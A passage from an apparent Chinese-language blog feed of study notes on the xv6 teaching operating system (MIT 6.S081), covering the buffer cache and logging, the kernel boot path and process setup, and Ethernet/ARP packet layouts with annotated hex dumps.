class="hljs-keyword">if</span>(recovering == <span class="hljs-number">0</span>)<br>      <span class="hljs-title function_">bunpin</span>(dbuf);<br>    <span class="hljs-title function_">brelse</span>(lbuf);<br>    <span class="hljs-title function_">brelse</span>(dbuf);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看下write_head，bread会往该缓存blokcbuf加睡眠锁，该睡眠锁持续时间挺长，然后bwrite正在写入buf数据到disk，最好释放该睡眠锁。</p><p>如果这里不用睡眠锁，使用自旋锁可以吗？</p><p>不可以，首先这里锁的加的时间挺长，和磁盘交互时间一般是比较大的，也就是说这段时间不会让出cpu，但cpu下导致其他进程被迫等待；且自旋锁加锁期间不允许中断，这意味着bread和bwrite将永远无法完成和disk的交互</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br><span class="hljs-title function_">write_head</span>(<span class="hljs-params"><span class="hljs-keyword">void</span></span>)<br>&#123;<br>  struct buf *buf = <span class="hljs-title function_">bread</span>(log.<span class="hljs-property">dev</span>, log.<span class="hljs-property">start</span>);<br>  struct logheader *hb = (struct logheader *) (buf-&gt;data);<br>  int i;<br>  hb-&gt;n = log.<span class="hljs-property">lh</span>.<span class="hljs-property">n</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; log.<span class="hljs-property">lh</span>.<span class="hljs-property">n</span>; i++) &#123;<br>    hb-&gt;block[i] = log.<span class="hljs-property">lh</span>.<span class="hljs-property">block</span>[i];<br>  &#125;<br>  <span class="hljs-title function_">bwrite</span>(buf);<br>  <span class="hljs-title function_">brelse</span>(buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>关于缓存链表：blockcache的实现，这对于性能来说是至关重要的，因为读写磁盘是代价较高的操作，可能要消耗数百毫秒，而blockcache确保了如果我们最近从磁盘读取了一个block，那么我们将不会再从磁盘读取相同的block。</p><p>brelese函数中首先释放了sleeplock；之后获取了bcache的锁；之后减少了blockcache的引用计数，表明一个进程不再对blockcache感兴趣；最后如果引用计数为0，那么它会修改buffercache的linked-list，将blockcache移到linked-list的头部，这样表示这个block cache是最近使用过的blockcache。这一点很重要，当我们在bget函数中不能找到blockcache时，我们需要在buffer cache中腾出空间来存放新的blockcache，这时会使用LRU（Least Recent Used）算法找出最不常使用的blockcache，并撤回它（注，而将刚刚使用过的blockcache放在linked-list的头部就可以直接更新linked-list的tail来完成LRU操作）。为什么这是一个好的策略呢？因为通常系统都遵循temporallocality策略，也就是说如果一个blockcache最近被使用过，那么很有可能它很快会再被使用，所以最好不要撤回这样的blockcache。</p><p>以上就是对于block cache代码的介绍。这里有几件事情需要注意：</p><ul><li><strong>首先在内存中，对于一个block只能有一份缓存。这是blockcache必须维护的特性。</strong></li><li>其次，这里使用了与之前的spinlock略微不同的sleeplock。与spinlock不同的是，可以在I/O操作的过程中持有sleep lock。</li><li>第三，它采用了LRU作为cache替换策略。</li><li>第四，<strong>它有两层锁。第一层锁用来保护buffercache的内部数据；第二层锁也就是sleeplock用来保护单个block的cache。</strong></li></ul><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDM5MmY4ZmJlOGQyZmY2YmQ5ZGQzMDVhNjk0ODkzYjhfbFZmNHpuUnZ4QXVRT0V2akJuUmlIeVJ6OVEwSnNUeGJfVG9rZW46UDZ6TmJTeGJkb0JMMEF4eGt3cmNxWnJVbnhjXzE2OTY1NzQ1OTc6MTY5NjU3ODE5N19WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>以创建为例，其整体的调用链路如下：</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=MzYzZWQ0NTkwN2M2MWQ0NmVlMjYwYmY5NmY4OGMzOWFfUEVaWEVMTFFoNWVJemszRVVLdzE5dERhV1BEeDBLRWlfVG9rZW46SllybmJSY2Fnb3FUMlF4eTg2S2NQM2c0blVkXzE2OTY1NzQ1OTc6MTY5NjU3ODE5N19WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>关键在于</p><ol type="1"><li>每一个系统调用之间都会有begin_op和end_op，begin_op表明想要开始一个事务，在最后有end_op表示事务的结束。并且事务中的所有写block操作具备原子性，这意味着这些写block操作要么全写入，要么全不写入。</li><li>和文件相关的和inode的代码都在bio.c里，比如创建文件是ialloc，写入文件是walloc</li><li>inode对应buffer cachelinklist里的一个buf节点，其数据存在data成员上，其存储的block再blockno上</li><li>每一次commit都是commit一个inode（即一个文件，一个blockno，根据一个inode即可算出对应的blockno）以及相关的logheader</li></ol>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，计算机基础, C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xv6 Booting</title>
    <link href="/emocoder/2023/10/05/oslearning/mit-6.s081/booting/main/"/>
    <url>/emocoder/2023/10/05/oslearning/mit-6.s081/booting/main/</url>
    
    <content type="html"><![CDATA[<p>首先，写在<strong>ROM</strong>中的<strong>bootloader</strong>，将内核装载入内存中，并将执行流跳转到固定的入口点(代码写死在ROM中，自然跳转的入口点也是固定的)</p><p>因此，编译内核时，需要将内核的入口函数**_entry<strong>(kernel/entry.S:6)编译到</strong>bootloader**指定的地址处(xv6是0x80000000)</p><p>而为了<em>让生活更美好</em>，**_entry<strong>函数使用汇编指令初始化栈后，跳转到使用C语言编写的</strong>start<strong>(kernel/start.c:20)。</strong>start<strong>函数的主要工作就是设置</strong>CSRs<strong>(controland state registers)，从而切换到</strong>S-mode<strong>(supervisormode)，并将执行流设置成</strong>main<strong>(kernel/main.c:10)。</strong>start<strong>函数实现的非常巧妙，其通过设置</strong>CSRs<strong>，伪造一个异常处理保存的上下文，其上下文的特权级是</strong>S-mode<strong>，PC是</strong>main<strong>。执行</strong>mret**指令后，通过恢复上下文，完成特权级和执行流的转换</p><p>在<strong>main</strong>函数中，即初始化内核的子系统，并执行<strong>userinit</strong>(kernel/proc.c:211)，创建第一个进程。<strong>userinit</strong>函数申请进程描述符和虚拟地址空间等资源，将<strong>initcode.S</strong>(user/initcode.S:1)的汇编代码映射入进程中并设置为进程入口函数。</p><p><strong>initcode.S</strong>(user/initcode.S:1)中，将<strong>/init加载到内存中，它</strong>是user/init.c编译的可执行程序，其初始化中断设备，初始化文件描述符，并启动<strong>sh</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span><br><span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">if</span>(cpuid() == <span class="hljs-number">0</span>)&#123; <br>    consoleinit();<br>    printfinit();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;xv6 kernel is booting\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    kinit();         <span class="hljs-comment">// 初始化内存</span><br>    kvminit();       <span class="hljs-comment">// 为设备和kernel建设页表映射</span><br>    kvminithart();   <span class="hljs-comment">// 设置SATP寄存器为刚才的kernel_pagetable变量，当这里这条指令执行之后，下一个指令的地址会发生什么？</span><br>    所以这条指令的执行时刻是一个非常重要的时刻。因为整个地址翻译从这条指令之后开始生效，之后的每一个使用的内存地址都可能对应到与之不同的物理内存地址。因为在这条指令之前，我们使用的都是物理内存地址，这条指令之后page table开始生效，所有的内存地址都变成了另一个含义，也就是虚拟内存地址。<br>这里能正常工作的原因是值得注意的。因为前一条指令还是在物理内存中，而后一条指令已经在虚拟内存中了。比如，下一条指令地址是<span class="hljs-number">0x80001110</span>就是一个虚拟内存地址。等等，<span class="hljs-number">0x80001110</span>看起来好像还是物理地址，这是怎么回事？因为kernel page的映射关系中，虚拟地址到物理地址是完全相等的。所以，在我们打开虚拟地址翻译硬件之后，地址翻译硬件会将一个虚拟地址翻译到相同的物理地址。所以实际上，我们最终还是能通过内存地址执行到正确的指令，因为经过地址翻译<span class="hljs-number">0x80001110</span>还是对应<span class="hljs-number">0x80001110</span>。<br><br>    procinit();      <span class="hljs-comment">// process table</span><br>    trapinit();      <span class="hljs-comment">// trap vectors</span><br>    trapinithart();  <span class="hljs-comment">// install kernel trap vector</span><br>    plicinit();      <span class="hljs-comment">// set up interrupt controller</span><br>    plicinithart();  <span class="hljs-comment">// ask PLIC for device interrupts</span><br>    binit();         <span class="hljs-comment">// buffer cache</span><br>    iinit();         <span class="hljs-comment">// inode table</span><br>    fileinit();      <span class="hljs-comment">// 文件系统初始化</span><br>    virtio_disk_init(); <span class="hljs-comment">// emulated hard disk</span><br>    userinit();      <span class="hljs-comment">// 启动用户进程</span><br>    __sync_synchronize();<br>    started = <span class="hljs-number">1</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">while</span>(started == <span class="hljs-number">0</span>)<br>      ;   <br>    __sync_synchronize();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hart %d starting\n&quot;</span>, cpuid());<br>    kvminithart();    <span class="hljs-comment">// turn on paging</span><br>    trapinithart();   <span class="hljs-comment">// install kernel trap vector</span><br>    plicinithart();   <span class="hljs-comment">// ask PLIC for device interrupts</span><br>  &#125;<br><br>  scheduler();    <br>&#125;<br><br><br><span class="hljs-comment">// 进程初始化，为每个进程分配kernel stack</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">procinit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span> <br>  <br>  initlock(&amp;pid_lock, <span class="hljs-string">&quot;nextpid&quot;</span>);<br>  initlock(&amp;wait_lock, <span class="hljs-string">&quot;wait_lock&quot;</span>);<br>  <span class="hljs-keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;<br>      initlock(&amp;p-&gt;lock, <span class="hljs-string">&quot;proc&quot;</span>);<br>      p-&gt;kstack = KSTACK((<span class="hljs-type">int</span>) (p - proc));<br>  &#125;<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">trapinit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  initlock(&amp;tickslock, <span class="hljs-string">&quot;time&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// set up to take exceptions and traps while in the kernel.</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">trapinithart</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  w_stvec((uint64)kernelvec); <span class="hljs-comment">// 设置stvec指向kernelvec，kernelvec是一个.S文件，当有中断产生时，会通过ecall进入管理员模式，同时由ecall指令设置stvec指向trampoline，这是硬件层面做的吗？在代码里并没x有看到任何像w_stvec(trampolone)的代码。</span><br>&#125;<br><br><span class="hljs-comment">// Set up first user process.</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">userinit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span> <br><br>  p = allocproc();<br>  initproc = p;<br>  <br>  <span class="hljs-comment">// allocate one user page and copy init&#x27;s instructions</span><br>  <span class="hljs-comment">// and data into it.</span><br>  uvminit(p-&gt;pagetable, initcode, <span class="hljs-keyword">sizeof</span>(initcode));<br>  p-&gt;sz = PGSIZE;<br><br>  <span class="hljs-comment">// prepare for the very first &quot;return&quot; from kernel to user.</span><br>  p-&gt;trapframe-&gt;epc = <span class="hljs-number">0</span>;      <span class="hljs-comment">// user program counter</span><br>  p-&gt;trapframe-&gt;sp = PGSIZE;  <span class="hljs-comment">// user stack pointer</span><br><br>  safestrcpy(p-&gt;name, <span class="hljs-string">&quot;initcode&quot;</span>, <span class="hljs-keyword">sizeof</span>(p-&gt;name));<br>  p-&gt;cwd = namei(<span class="hljs-string">&quot;/&quot;</span>);<br><br>  p-&gt;state = RUNNABLE;<br><br>  release(&amp;p-&gt;lock);<br>&#125;<br><br><span class="hljs-comment">// Look in the process table for an UNUSED proc.</span><br><span class="hljs-comment">// If found, initialize state required to run in the kernel,</span><br><span class="hljs-comment">// and return with p-&gt;lock held.</span><br><span class="hljs-comment">// If there are no free procs, or a memory allocation fails, return 0.</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> proc*<br><span class="hljs-title function_">allocproc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span><br><br>  <span class="hljs-keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;<br>    acquire(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">if</span>(p-&gt;state == UNUSED) &#123;<br>      <span class="hljs-keyword">goto</span> found;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      release(&amp;p-&gt;lock);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>found:<br>  p-&gt;pid = allocpid();<br>  p-&gt;state = USED;<br><br>  <span class="hljs-comment">// Allocate a trapframe page.</span><br>  <span class="hljs-keyword">if</span>((p-&gt;trapframe = (<span class="hljs-keyword">struct</span> trapframe *)kalloc()) == <span class="hljs-number">0</span>)&#123;<br>    freeproc(p);<br>    release(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// An empty user page table.</span><br>  p-&gt;pagetable = proc_pagetable(p);<br>  <span class="hljs-keyword">if</span>(p-&gt;pagetable == <span class="hljs-number">0</span>)&#123;<br>    freeproc(p);<br>    release(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// Set up new context to start executing at forkret,</span><br>  <span class="hljs-comment">// which returns to user space.</span><br>  <span class="hljs-built_in">memset</span>(&amp;p-&gt;context, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(p-&gt;context));<br>  p-&gt;context.ra = (uint64)forkret;<br>  p-&gt;context.sp = p-&gt;kstack + PGSIZE;<br><br>  <span class="hljs-keyword">return</span> p;<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">growproc</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span><br>&#123;<br>  uint sz; <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br><br>  sz = p-&gt;sz; <span class="hljs-comment">// va每次递增都是基于之前的sz大小进行递增的，初始的时候是0，所以va起始于0</span><br>  <span class="hljs-keyword">if</span>(n &gt; <span class="hljs-number">0</span>)&#123; <br>    <span class="hljs-keyword">if</span>((sz = uvmalloc(p-&gt;pagetable, sz, sz + n)) == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <br>    &#125;   <br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n &lt; <span class="hljs-number">0</span>)&#123; <br>    sz = uvmdealloc(p-&gt;pagetable, sz, sz + n); <br>  &#125;<br>  p-&gt;sz = sz; <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">pagetable_t</span><br><span class="hljs-title function_">proc_pagetable</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> proc *p)</span> <br>&#123;<br>  <span class="hljs-type">pagetable_t</span> pagetable;<br><br>  <span class="hljs-comment">// An empty page table.</span><br>  pagetable = uvmcreate();<br>  <span class="hljs-keyword">if</span>(pagetable == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">// map the trampoline code (for system call return)</span><br>  <span class="hljs-comment">// at the highest user virtual address.</span><br>  <span class="hljs-comment">// only the supervisor uses it, on the way</span><br>  <span class="hljs-comment">// to/from user space, so not PTE_U.</span><br>  <span class="hljs-keyword">if</span>(mappages(pagetable, TRAMPOLINE, PGSIZE,<br>              (uint64)trampoline, PTE_R | PTE_X) &lt; <span class="hljs-number">0</span>)&#123; <br>    uvmfree(pagetable, <span class="hljs-number">0</span>); <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// map the trapframe just below TRAMPOLINE, for trampoline.S.</span><br>  <span class="hljs-keyword">if</span>(mappages(pagetable, TRAPFRAME, PGSIZE,<br>              (uint64)(p-&gt;trapframe), PTE_R | PTE_W) &lt; <span class="hljs-number">0</span>)&#123; <br>    uvmunmap(pagetable, TRAMPOLINE, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>); <br>    uvmfree(pagetable, <span class="hljs-number">0</span>); <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> pagetable;<br>&#125;<br></code></pre></td></tr></table></figure><p>虚拟内存和物理内存之间映射其中有几点需要注意下：</p><p>它被映射到虚拟地址空间的顶端，用户和内核的页表里都有这一项映射，摆放的位置相同，很快我们将在下一章介绍这一页的作用。trampoline页被映射了两次，一次映射到虚拟地址空间的顶端，一次是直接映射。为什么要这样设计呢？</p><p>为了在user space和kernelspace之间切换时，trampoline的汇编代码在切换前后仍然能够继续执行。</p><p>code to switch between user and kernel space.</p><p>this code is mapped at the same virtual address</p><p>(TRAMPOLINE) in user and kernel space so that</p><p>it continues to work when it switches page tables.</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，计算机基础, C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Network</title>
    <link href="/emocoder/2023/10/05/oslearning/mit-6.s081/network/os-learning7/"/>
    <url>/emocoder/2023/10/05/oslearning/mit-6.s081/network/os-learning7/</url>
    
    <content type="html"><![CDATA[<h2 id="网络协议">网络协议</h2><p>Browser =&gt; LAN =&gt; Http server(本地通信由以太网负责)</p><p>但是这不能建立一个简单的网络，如果希望建立一个庞大的网络，需要网络层协议：</p><p>Broswer =&gt; LAN1 =&gt; Router =&gt; LAN2 =&gt; httpserver(远程通信由IP层负责)</p><h3 id="以太网协议">以太网协议</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">#define ETHADDR_LEN 6</span><br><span class="hljs-string">struct</span> <span class="hljs-string">eth</span> &#123;<br><span class="hljs-string">uint8</span> <span class="hljs-string">dhost</span> [<span class="hljs-string">ETHADDR_LEN</span>]<span class="hljs-string">;</span><br><span class="hljs-string">uint8</span> <span class="hljs-string">shost</span> [<span class="hljs-string">ETHADDR_LEN</span>]<span class="hljs-string">;</span><br><span class="hljs-string">uint16</span> <span class="hljs-string">type</span> <span class="hljs-string">//</span> <span class="hljs-string">它的上层协议类型</span><br>&#125; <span class="hljs-string">__attributr__((packed));</span><br><br><span class="hljs-comment">#define ETHTYPE_IP 0x0800 // ip</span><br><span class="hljs-comment">#define ETHTYPE_ARP 0x0806 // arp</span><br><br><br><span class="hljs-comment">#[payload][T16*8bit][S48bit][D48bit], 前24bit是制造商编号，后24bit是网卡编号]#</span><br><span class="hljs-comment">#表示包的开始和结束，#是给硬件识别的标志</span><br><br><br><span class="hljs-string">ARP,</span> <span class="hljs-string">Request</span> <span class="hljs-string">who-has</span> <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.15</span> <span class="hljs-string">tell</span> <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span><span class="hljs-string">,</span> <span class="hljs-string">length</span> <span class="hljs-number">28</span><br><span class="hljs-attr">0x0000:</span> <span class="hljs-string">ffff</span> <span class="hljs-string">ffff</span> <span class="hljs-string">ffff(48bit,</span> <span class="hljs-string">这里表示广播地址)</span> <span class="hljs-number">5255 </span><span class="hljs-string">0a00</span> <span class="hljs-number">0202</span><span class="hljs-string">(src</span> <span class="hljs-string">host</span> <span class="hljs-string">mac)</span> <span class="hljs-number">0806</span><span class="hljs-string">(16</span> <span class="hljs-string">bit</span> <span class="hljs-string">type)</span> <span class="hljs-number">0001</span><span class="hljs-string">(payload)</span><br><span class="hljs-attr">0x0010:</span> <span class="hljs-number">0800 </span><span class="hljs-number">0604 </span><span class="hljs-number">0001</span><span class="hljs-string">(这里0001~这里，共64</span> <span class="hljs-string">bytes是hrd</span> <span class="hljs-string">+</span> <span class="hljs-string">pro</span> <span class="hljs-string">+</span> <span class="hljs-string">hln</span> <span class="hljs-string">+</span> <span class="hljs-string">pln</span> <span class="hljs-string">+</span> <span class="hljs-string">op)</span> <span class="hljs-number">5255 </span><span class="hljs-string">0a00</span> <span class="hljs-number">0202</span><span class="hljs-string">(sender</span> <span class="hljs-string">ethnet</span> <span class="hljs-string">addr)</span> <span class="hljs-string">0a00</span> <span class="hljs-number">0202</span><span class="hljs-string">(sip,</span> <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.2</span><span class="hljs-string">)</span><br><span class="hljs-attr">0x0020:</span> <span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000</span><span class="hljs-string">(target</span> <span class="hljs-string">ethnet</span> <span class="hljs-string">addr,</span> <span class="hljs-string">unknown</span> <span class="hljs-string">when</span> <span class="hljs-string">request)</span> <span class="hljs-string">0a00</span> <span class="hljs-string">020f(tip,</span> <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.15</span><span class="hljs-string">)</span><br></code></pre></td></tr></table></figure><h3 id="arp协议">ARP协议</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><br><span class="hljs-string">ARP,</span> <span class="hljs-string">Reply</span> <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.15</span> <span class="hljs-string">is-at</span> <span class="hljs-number">52</span><span class="hljs-string">:44:00:12:34:56,</span> <span class="hljs-string">length</span> <span class="hljs-number">28</span><br><span class="hljs-attr">0x0000:</span> <span class="hljs-string">ffff</span> <span class="hljs-string">ffff</span> <span class="hljs-string">ffff(48bit,</span> <span class="hljs-string">这里表示广播地址)</span> <span class="hljs-number">5255 </span><span class="hljs-string">0a00</span> <span class="hljs-number">0202</span><span class="hljs-string">(src</span> <span class="hljs-string">host</span> <span class="hljs-string">mac)</span> <span class="hljs-number">0806</span><span class="hljs-string">(16</span> <span class="hljs-string">bit</span> <span class="hljs-string">type)</span> <span class="hljs-number">0001</span><span class="hljs-string">(payload)</span>   <span class="hljs-string">.....RU.....(.表示没有对应的ascii)</span><br><span class="hljs-attr">0x0010:</span> <span class="hljs-number">0800 </span><span class="hljs-number">0604 </span><span class="hljs-number">0002 </span><span class="hljs-number">5254 </span><span class="hljs-string">0a00</span> <span class="hljs-number">0202 </span><span class="hljs-string">0a00</span> <span class="hljs-number">0202</span><br><span class="hljs-attr">0x0020:</span> <span class="hljs-number">5255 </span><span class="hljs-string">0a00</span> <span class="hljs-number">0202 </span><span class="hljs-string">0a00</span> <span class="hljs-number">0202</span><br><br><br><span class="hljs-string">struct</span> <span class="hljs-string">arp</span> &#123;<br><span class="hljs-string">uint16</span> <span class="hljs-string">hrd</span><br><span class="hljs-string">uint16</span> <span class="hljs-string">pro</span><br><span class="hljs-string">uint8</span> <span class="hljs-string">hln</span><br><span class="hljs-string">uint8</span> <span class="hljs-string">pln</span><br><span class="hljs-string">uint16</span> <span class="hljs-string">op</span><br><br><span class="hljs-string">char</span> <span class="hljs-string">sha</span>[<span class="hljs-string">ETHADDR_LEN</span>]<br><span class="hljs-string">uint32</span> <span class="hljs-string">sip</span><br><span class="hljs-string">char</span> <span class="hljs-string">tha</span>[<span 